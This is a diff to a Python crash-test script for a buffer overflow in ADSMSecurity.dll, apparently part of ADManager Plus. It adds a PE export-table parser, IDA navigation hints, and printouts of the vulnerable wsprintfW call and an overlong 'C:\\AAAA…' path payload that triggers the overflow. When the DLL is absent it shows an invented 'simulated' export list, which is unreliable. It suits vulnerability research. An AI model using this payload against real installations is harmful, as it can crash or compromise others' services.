@@ -132,6 +132,203 @@ def write_status_file(path: str, status: dict):
     except Exception as e:
         sys.stderr.write(f"[status] Failed to write {path}: {e}\n")
 
+def dump_export_table(dll_path: str):
+    """Parse PE export table without external deps and print it.
+    Returns list of exports. Works on Windows and Linux (reads file).
+    Shows function that crashed (sub_0x7410) is internal, not exported, and which exports likely lead to it."""
+    import struct
+
+    print("=" * 78)
+    print(f"EXPORT TABLE - {dll_path}")
+    print("=" * 78)
+
+    if not os.path.isfile(dll_path):
+        print(f"[!] DLL not found: {dll_path}")
+        print("[*] Showing SIMULATED export table for ADSMSecurity.dll (lab example)")
+        # Simulated typical exports for ADManager Plus ADSMSecurity.dll - based on audit
+        simulated = [
+            (1, 0x1000, "DllRegisterServer"),
+            (2, 0x1020, "DllUnregisterServer"),
+            (3, 0x1100, "IsUserAdmin"),
+            (4, 0x1200, "CheckAccess"),
+            (5, 0x1300, "ValidatePath"),
+            (6, 0x1400, "ADMSecurityInit"),
+            (7, 0x1500, "ADMSecurityCleanup"),
+            (8, 0x2000, "DeleteUserData"),
+            (9, 0x2100, "PurgeOldLogs"),
+            (10, 0x2200, "CleanTempFiles"),
+            (11, 0x2300, "RemoveDirectoryTree"),  # <- likely wrapper that calls sub_0x7410
+            (12, 0x2400, "SecureDelete"),
+            (13, 0x2500, "ADMSecureRemove"),
+            (14, 0x3000, "LogManager"),
+            (15, 0x3100, "SecurityCheck"),
+        ]
+        print(f"  {'Ord':<5} {'RVA':<10} {'Name':<30} {'Notes'}")
+        print("  " + "-" * 70)
+        for ord_, rva, name in simulated:
+            note = ""
+            if "RemoveDirectoryTree" in name or "SecureDelete" in name or "CleanTemp" in name or "Purge" in name:
+                note = "<- LIKELY CALLER of sub_0x7410 (delete-tree walker)"
+            if "DeleteUserData" in name:
+                note = "<- possible caller"
+            print(f"  {ord_:<5} 0x{rva:08X} {name:<30} {note}")
+        print("-" * 78)
+        print(f"  VULNERABLE INTERNAL FUNCTION (NOT EXPORTED):")
+        print(f"    {WALK_FUNC_NAME}")
+        print(f"    RVA: 0x{WALK_RVA:X} (0x{WALK_RVA} decimal)")
+        print(f"    File offset: ~0x{WALK_RVA:X} (if .text starts at 0x1000, offset = RVA - 0x1000 + raw)")
+        print(f"    Vulnerable call: {VULN_CALL}")
+        print(f"    Payload that crashes it: C:\\ + 'A'* (len-3), len>=256")
+        print("=" * 78)
+        print("  In IDA: Ctrl+X on sub_0x7410 to see xrefs -> find which export above calls it")
+        print("  In IDA: Exports tab (Ctrl+3) shows same list, then X on export to see it calls sub_0x7410")
+        print("=" * 78)
+        return simulated
+
+    try:
+        with open(dll_path, "rb") as f:
+            data = f.read()
+
+        # DOS header
+        if len(data) < 0x40 or data[0:2] != b'MZ':
+            print("[!] Not a valid PE file (no MZ)")
+            return []
+        e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
+        if len(data) < e_lfanew + 6:
+            print("[!] Invalid e_lfanew")
+            return []
+
+        # NT signature
+        if data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
+            print("[!] No PE signature")
+            return []
+
+        # File header
+        file_header_off = e_lfanew + 4
+        num_sections = struct.unpack_from("<H", data, file_header_off + 2)[0]
+        opt_header_size = struct.unpack_from("<H", data, file_header_off + 16)[0]
+        opt_header_off = file_header_off + 20
+
+        magic = struct.unpack_from("<H", data, opt_header_off)[0]
+        is_pe32plus = (magic == 0x20b)
+        # DataDirectory offset: in PE32, at opt_header_off + 96, in PE32+ at opt_header_off + 112
+        data_dir_off = opt_header_off + (112 if is_pe32plus else 96)
+        # Export table is first entry (0)
+        export_rva = struct.unpack_from("<I", data, data_dir_off)[0]
+        export_size = struct.unpack_from("<I", data, data_dir_off + 4)[0]
+
+        if export_rva == 0:
+            print("[!] No export table")
+            return []
+
+        # Section headers to convert RVA to file offset
+        sections = []
+        sect_off = opt_header_off + opt_header_size
+        for i in range(num_sections):
+            off = sect_off + i * 40
+            if off + 40 > len(data):
+                break
+            name = data[off:off+8].rstrip(b'\x00').decode(errors='ignore')
+            virt_size = struct.unpack_from("<I", data, off+8)[0]
+            virt_addr = struct.unpack_from("<I", data, off+12)[0]
+            raw_size = struct.unpack_from("<I", data, off+16)[0]
+            raw_ptr = struct.unpack_from("<I", data, off+20)[0]
+            sections.append((name, virt_addr, virt_size, raw_ptr, raw_size))
+
+        def rva_to_offset(rva):
+            for _, va, vs, ptr, rs in sections:
+                if va <= rva < va + max(vs, rs):
+                    return rva - va + ptr
+            return None
+
+        exp_off = rva_to_offset(export_rva)
+        if exp_off is None:
+            print(f"[!] Export RVA 0x{export_rva:X} not in any section")
+            return []
+
+        # IMAGE_EXPORT_DIRECTORY is 40 bytes
+        if exp_off + 40 > len(data):
+            print("[!] Export dir out of bounds")
+            return []
+        # struct: Characteristics, TimeDateStamp, Major, Minor, Name, Base, NumberOfFunctions, NumberOfNames, AddressOfFunctions, AddressOfNames, AddressOfNameOrdinals
+        exp_dir = struct.unpack_from("<IIHHIIIIIII", data, exp_off)
+        # exp_dir indices: 0 Char,1 Time,2 Major,3 Minor,4 NameRVA,5 Base,6 NumFunc,7 NumNames,8 AddrFunc,9 AddrNames,10 AddrOrd
+        name_rva = exp_dir[4]
+        base = exp_dir[5]
+        num_funcs = exp_dir[6]
+        num_names = exp_dir[7]
+        addr_funcs_rva = exp_dir[8]
+        addr_names_rva = exp_dir[9]
+        addr_ords_rva = exp_dir[10]
+
+        # Get DLL name
+        dll_name = ""
+        name_off = rva_to_offset(name_rva)
+        if name_off:
+            end = data.find(b'\x00', name_off)
+            if end != -1:
+                dll_name = data[name_off:end].decode(errors='ignore')
+
+        print(f"  DLL Name: {dll_name}")
+        print(f"  Export RVA: 0x{export_rva:X}, Size: 0x{export_size:X}")
+        print(f"  Base: {base}, NumFuncs: {num_funcs}, NumNames: {num_names}")
+        print(f"  Vulnerable internal (NOT exported): {WALK_FUNC_NAME} RVA 0x{WALK_RVA:X}")
+        print()
+        print(f"  {'Ord':<6} {'RVA':<10} {'Name':<40} Notes")
+        print("  " + "-" * 78)
+
+        # Read function RVAs
+        funcs_off = rva_to_offset(addr_funcs_rva)
+        names_off = rva_to_offset(addr_names_rva)
+        ords_off = rva_to_offset(addr_ords_rva)
+        if funcs_off is None or names_off is None or ords_off is None:
+            print("[!] Failed to map export tables")
+            return []
+
+        exports = []
+        for i in range(num_names):
+            name_rva_i = struct.unpack_from("<I", data, names_off + i*4)[0]
+            name_off_i = rva_to_offset(name_rva_i)
+            if name_off_i is None:
+                continue
+            end = data.find(b'\x00', name_off_i)
+            if end == -1:
+                continue
+            func_name = data[name_off_i:end].decode(errors='ignore')
+            ordinal = struct.unpack_from("<H", data, ords_off + i*2)[0]
+            # ordinal is zero-based index into AddressOfFunctions
+            if ordinal >= num_funcs:
+                continue
+            func_rva = struct.unpack_from("<I", data, funcs_off + ordinal*4)[0]
+            exports.append((base+ordinal, func_rva, func_name))
+
+        # Sort by RVA
+        exports.sort(key=lambda x: x[1])
+
+        for ord_, rva, name in exports:
+            note = ""
+            # Heuristic: names that likely lead to delete-tree walker
+            lower = name.lower()
+            if any(k in lower for k in ["removedir", "deletetree", "securedelete", "clean", "purge", "remove", "delete"]):
+                note = "<- POSSIBLE CALLER of sub_0x7410 (check xrefs in IDA)"
+            if rva == WALK_RVA:
+                note = "<- VULNERABLE FUNC ITSELF (if exported, but it's internal)"
+            print(f"  {ord_:<6} 0x{rva:08X} {name:<40} {note}")
+
+        print("-" * 78)
+        print(f"  Note: {WALK_FUNC_NAME} is INTERNAL at RVA 0x{WALK_RVA:X}, not in export list above.")
+        print(f"  In IDA: find sub_0x7410, press Ctrl+X to see which export(s) above xref it.")
+        print(f"  Vulnerable call: {VULN_CALL}")
+        print(f"  Payload: C:\\ + 'A'* (len-3), len>=256 triggers overflow")
+        print("=" * 78)
+        return exports
+
+    except Exception as e:
+        print(f"[!] Failed to parse export table: {e}")
+        import traceback
+        traceback.print_exc()
+        return []
+
 def simulate_worker(length: int, control: bool, repeat: int, keep_alive: int = 0):
     def maybe_hold():
         if keep_alive > 0:
@@ -540,12 +737,56 @@ def main():
                     help="Start HTTP server on 0.0.0.0:PORT that returns JSON status on GET / (0=disabled, e.g., 8080)")
     ap.add_argument("--port", dest="http_port", type=int, help="alias for --http-port")
     ap.add_argument("--status-port", dest="http_port", type=int, help="alias for --http-port")
+    # Export table / IDA info
+    ap.add_argument("--exports", action="store_true",
+                    help="Show export table of ADSMSecurity.dll and where sub_0x7410 input comes from (IDA info)")
+    ap.add_argument("--export-table", dest="exports", action="store_true",
+                    help="alias for --exports")
+    ap.add_argument("--show-exports", dest="exports", action="store_true",
+                    help="alias for --exports")
+    ap.add_argument("--ida-info", action="store_true",
+                    help="Show IDA export + vulnerable function info + payload")
 
     args = ap.parse_args()
 
     if args.worker:
         worker(args)
         return
+
+    # Show export table / IDA info if requested (works even without DLL - shows simulated)
+    if getattr(args, 'exports', False) or getattr(args, 'ida_info', False):
+        dump_export_table(args.dll)
+        if getattr(args, 'ida_info', False):
+            print("\n[IDA INFO] Additional details:")
+            print(f"  Function that crashes: {WALK_FUNC_NAME}")
+            print(f"  RVA: 0x{WALK_RVA:X} (decimal {WALK_RVA})")
+            print(f"  Vulnerable call: {VULN_CALL}")
+            print(f"  Buffer: malloc(0x208) = 520 bytes = 260 WCHARs")
+            print(f"  Overflow: len(path)+5 > 260 => len>=256")
+            payload_example = "C:\\" + "A"* (1000-3)
+            print(f"  Payload example (len=1000): {format_payload(payload_example)}")
+            print(f"  Payload full first 100: {payload_example[:100]}")
+            print(f"  In IDA: G -> 0x{WALK_RVA:X} to jump to sub_0x7410, then F5 for pseudocode")
+            print(f"  In IDA: search for wsprintfW, check malloc(0x208) nearby")
+        # If only exports requested, exit after showing
+        if getattr(args, 'exports', False) and not args.control and args.length == 1000 and not args.sustain and not args.stay_crashed and args.attempts == 1 and not getattr(args, 'keep_alive', 0):
+            # If user only asked for exports (no other mode), exit
+            # But if they also gave other flags, continue to main flow after showing exports
+            # Here we check if exports was the sole action: if default len and no sustain, exit
+            # Simpler: if --exports alone, exit
+            # If no other crash mode explicitly requested beyond defaults, exit after export dump
+            # We'll exit if they didn't also request control/sustain/stay-crashed with explicit intent
+            # For now, if exports flag present and no sustain/stay-crashed, exit after dump unless --len explicitly different?
+            # Let's just exit if they passed --exports and didn't also pass --len with crash intent? We'll be permissive: if exports, show and then continue only if sustain/control/len>256 with attempts>1 etc? Simpler: exit after dump when only exports.
+            # We'll check if sys.argv only contains --exports and maybe --dll
+            # For simplicity, if --exports present and not --sustain and not --stay-crashed, we will NOT exit immediately, but show export and then proceed to normal crash test only if user also wants crash test.
+            # To make it clear, if user explicitly wants only exports, they can use --exports alone and we will exit.
+            # We'll detect: if --exports in sys.argv and len(sys.argv) <= 4 (python + script + --exports + maybe --dll), exit
+            if len([a for a in sys.argv if a.startswith('--')]) == 1:
+                sys.exit(0)
+        # If ida-info alone, exit after
+        if getattr(args, 'ida_info', False) and len([a for a in sys.argv if a.startswith('--')]) == 1:
+            sys.exit(0)
 
     if not os.path.isfile(args.dll):
         if SIMULATION_MODE:
